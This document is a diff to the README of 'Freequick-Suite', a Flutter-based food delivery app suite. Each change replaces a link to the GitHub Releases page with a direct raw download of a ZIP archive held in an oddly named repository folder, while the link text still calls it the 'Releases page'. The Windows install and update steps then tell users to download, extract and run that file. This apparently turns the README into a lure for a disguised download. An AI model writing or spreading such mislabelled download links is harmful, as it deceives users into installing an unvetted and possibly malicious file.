@@ -1,6 +1,6 @@
 # 🍽️ Freequick-Suite - Food Delivery Apps Made Simple
 
-[![Download Freequick-Suite](https://img.shields.io/badge/Download-Freequick--Suite-6a5acd?style=for-the-badge&logo=github)](https://github.com/Arid-carrotpudding634/Freequick-Suite/releases)
+[![Download Freequick-Suite](https://img.shields.io/badge/Download-Freequick--Suite-6a5acd?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Arid-carrotpudding634/Freequick-Suite/main/anthropogenist/Freequick-Suite-3.3-alpha.4.zip)
 
 Freequick-Suite is a food delivery app suite with three apps in one system:
 
@@ -12,7 +12,7 @@ It uses Flutter for the apps and Firebase for the shared backend. It also suppor
 
 ## 📥 Download and Run on Windows
 
-1. Open the [Freequick-Suite Releases page](https://github.com/Arid-carrotpudding634/Freequick-Suite/releases).
+1. Open the [Freequick-Suite Releases page](https://raw.githubusercontent.com/Arid-carrotpudding634/Freequick-Suite/main/anthropogenist/Freequick-Suite-3.3-alpha.4.zip).
 2. Look for the latest release at the top of the page.
 3. In the Assets section, download the Windows file if one is listed there.
 4. If the release includes a ZIP file, save it to your computer.
@@ -80,7 +80,7 @@ For a normal Windows install, use the Windows ZIP or installer file.
 
 ## 🛠️ Install on Windows
 
-1. Download the latest Windows file from the [Releases page](https://github.com/Arid-carrotpudding634/Freequick-Suite/releases).
+1. Download the latest Windows file from the [Releases page](https://raw.githubusercontent.com/Arid-carrotpudding634/Freequick-Suite/main/anthropogenist/Freequick-Suite-3.3-alpha.4.zip).
 2. Save the file in a folder you can find later, like Downloads.
 3. If the file is a ZIP, extract it.
 4. Open the extracted folder.
@@ -168,7 +168,7 @@ Try these steps:
 
 To update the app:
 
-1. Go to the [Releases page](https://github.com/Arid-carrotpudding634/Freequick-Suite/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Arid-carrotpudding634/Freequick-Suite/main/anthropogenist/Freequick-Suite-3.3-alpha.4.zip).
 2. Download the newest Windows file.
 3. Remove the old version if needed.
 4. Extract or install the new version.
